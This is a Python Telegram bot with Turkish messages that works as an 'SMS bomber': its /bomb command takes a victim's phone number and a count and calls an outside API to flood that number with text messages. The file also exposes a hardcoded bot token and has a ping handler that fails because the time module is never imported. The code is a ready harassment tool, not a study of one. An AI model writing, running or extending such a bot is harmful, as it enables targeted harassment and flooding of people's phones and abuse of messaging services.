
import telebot
import logging
import os
import requests

TOKEN = '6357522659:AAFUp0jzOcLBNiNBPGON-SO6srVMC_dqpkw'

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    banned_ids = []
    with open('banneds.txt', 'r') as file:
        banned_ids = file.read().split('\n')
    user_id = message.from_user.id

    if str(user_id) in banned_ids:
        print('Kullanıcı yasaklandı:', user_id)
        bot.reply_to(message, 'Üzgünüz, yasaklandınız!')
    else:
        keyboard = telebot.types.InlineKeyboardMarkup()
        ping_button = telebot.types.InlineKeyboardButton('Ping değerini görüntüle', callback_data='ping')
        keyboard.add(ping_button)

        bot.reply_to(message, '*Merhaba, SMS bomber botuna hoş geldin!*'
                     '\n_Kullanmak için /bomb <numara> <miktar> yazmanız yeterlidir._',
                     parse_mode='Markdown', reply_markup=keyboard)

@bot.message_handler(commands=['bomb'])
def bomb(message):
    banned_ids = []
    with open('banneds.txt', 'r') as file:
        banned_ids = file.read().split('\n')
    user_id = message.from_user.id
    text = message.text
    matches = text.split()

    if str(user_id) in banned_ids:
        print('Kullanıcı yasaklandı:', user_id)
        bot.reply_to(message, 'Üzgünüz, yasaklandınız!')
    elif len(matches) < 3:
        bot.reply_to(message, 'Eksik parametreler! Doğru format: /bomb <numara> <miktar>')
    else:
        numara = matches[1]
        miktar = matches[2]

        response = requests.get(f'http://oslocheck.com.tr/api/smsbomber?key=ggsahip&numara={numara}&miktar={miktar}')
        responseData = response.json()

        if responseData:
            print('Alınan yanıt:', responseData)
            responseString = str(responseData)
            bot.reply_to(message, f'<b>Sonuç:</b> <code>{responseString}</code>', parse_mode='HTML')
        else:
            print('Geçersiz yanıt:', response)
            bot.reply_to(message, 'Bir hata oluştu, lütfen tekrar deneyin.')

@bot.message_handler(commands=['ban'])
def ban(message):
    if message.from_user.id != 6626904056:
        return

    banned_user_id = message.reply_to_message.from_user.id

    with open('banneds.txt', 'a') as file:
        file.write(f'\n{banned_user_id}')

    print('Kullanıcı yasaklandı:', banned_user_id)
    bot.reply_to(message, 'Kullanıcı yasaklandı!')

@bot.callback_query_handler(func=lambda call: call.data == 'ping')
def ping_callback(call):
    try:
        start = time.perf_counter()
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        bot.send_message(chat_id=chat_id, text='*Ping ölçülüyor...*', parse_mode='Markdown')
        end = time.perf_counter()
        ping_time = round((end - start) * 1000)
        alert_text = f'Ping değeri: {ping_time} ms'
        bot.delete_message(chat_id=chat_id, message_id=message_id)
        bot.send_message(chat_id=chat_id, text=f'*Ping değeri: {ping_time} ms*', parse_mode='Markdown',
                         reply_to_message_id=message_id)
        bot.answer_callback_query(callback_query_id=call.id, text=alert_text)
    except Exception as e:
        bot.reply_to(call.message, f'Ping hatası: {str(e)}')

bot.polling()
